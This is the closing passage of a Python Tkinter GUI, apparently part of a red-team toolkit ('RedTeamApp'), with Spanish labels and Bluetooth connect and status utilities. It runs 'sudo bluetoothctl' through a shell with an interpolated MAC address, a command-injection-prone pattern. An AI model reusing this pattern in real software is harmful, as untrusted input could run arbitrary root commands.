                self.escribir_consola(f"[*] Conectando...")
                result = subprocess.run(f"sudo bluetoothctl -- connect {mac}", shell=True, capture_output=True, text=True)
                
                if "Connection successful" in result.stdout or result.returncode == 0:
                    estado = "ÉXITO: Dispositivo BT vinculado."
                else:
                    estado = f"ERROR: {result.stderr.strip() or result.stdout.strip()}"
            except Exception as e:
                estado = f"EXCEPCIÓN: {e}"
            
            # Llamamos a la función correcta de mostrar resultados BT
            self.after(0, lambda: self._utils_bt_mostrar_resultado(estado))

        threading.Thread(target=conectar, daemon=True).start()

    def _utils_bt_mostrar_resultado(self, mensaje):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._utils_bluetooth_seleccionar_interfaz)
        ttk.Label(self.main_frame, text="RESULTADO", style='Title.TLabel').pack(pady=5)
        ttk.Label(self.main_frame, text=mensaje, wraplength=300).pack(pady=5)
        self.mostrar_consola()

    def _utils_bluetooth_estado(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_utils_menu)
        ttk.Label(self.main_frame, text="ESTADO BT", style='Title.TLabel').pack(pady=5)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        self.mostrar_consola(parent=scroll.scrollable_frame)
        for iface in self.obtener_interfaces_bluetooth():
            self.ejecutar_comando(f"hciconfig {iface} -a")


if __name__ == "__main__":
    app = RedTeamApp()
    app.mainloop()
